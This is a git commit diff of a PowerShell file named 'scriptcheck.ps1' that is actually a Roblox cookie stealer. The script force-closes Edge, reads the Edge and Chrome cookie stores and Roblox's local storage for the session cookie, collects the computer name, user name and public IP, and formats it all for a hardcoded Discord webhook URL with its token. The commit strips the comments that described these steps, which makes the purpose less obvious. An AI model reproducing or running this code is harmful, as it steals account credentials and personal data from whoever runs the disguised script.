e41f8525376acb7ce964bae7d4a6484edad00844
dih1234 <lawan.jalal54@gmail.com>
2026-08-14 13:50:52 +0200

    Update scriptcheck.ps1

--- scriptcheck.ps1
+++ scriptcheck.ps1
@@ -1,10 +1,8 @@
 $w = 'https://discord.com/api/webhooks/1537750275459121254/tii30i26ayBfg5HooY0xU6QRJflrTzeppVmbIBwz7FCZre3hV4j8TleoytkJsUoX4PLY'
 
-# Kill Edge to unlock cookie file
 Get-Process -Name msedge -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 
-# Try to get Roblox cookie from Edge
 $p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
 $rb = ''
 if (Test-Path $p) {
@@ -19,7 +17,6 @@ if (Test-Path $p) {
     }
 }
 
-# Try Chrome if Edge failed
 if ($rb -eq '') {
     $p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
     if (Test-Path $p) {
@@ -35,7 +32,6 @@ if ($rb -eq '') {
     }
 }
 
-# Try Roblox app
 if ($rb -eq '') {
     $paths = @("$env:APPDATA\Roblox\Local Storage\leveldb\*.log", "$env:APPDATA\Roblox\Local Storage\leveldb\*.ldb")
     foreach ($p in $paths) {
@@ -49,15 +45,13 @@ if ($rb -eq '') {
     }
 }
 
-# Get system info
 $ip = (Invoke-WebRequest -Uri 'http://api.ipify.org' -UseBasicParsing).Content
 $sys = "PC: $env:COMPUTERNAME`nUser: $env:USERNAME`nIP: $ip"
 
-# Build and send message
 if ($rb) {
-    $msg = "ScriptCheck Result`n$sys`n`nRoblox Cookie:`n$rb"
+    $msg = "Roblox Cookie Found`n$sys`n`n$rb"
 } else {
-    $msg = "ScriptCheck Result`n$sys`n`nRoblox Cookie: Not found"
+    $msg = "No Roblox Cookie Found`n$sys"
 }
 
 $body = @{ content = $msg } | ConvertTo-Json
